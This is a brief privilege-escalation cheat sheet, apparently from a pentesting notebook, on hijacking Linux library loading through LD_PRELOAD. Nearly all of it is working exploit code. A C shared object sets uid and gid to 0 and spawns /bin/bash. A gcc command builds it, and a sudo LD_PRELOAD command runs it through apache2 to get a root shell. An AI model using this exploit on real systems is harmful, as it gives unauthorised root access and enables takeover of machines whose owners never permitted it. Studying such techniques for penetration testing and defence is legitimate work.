# Linux: Hijack Library Loading LD_PRELOAD

OS: Linux
Description: Linux: Hijack Library Load Order
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

### Compile

```jsx
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

### Use LD_PRELOAD

```jsx
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```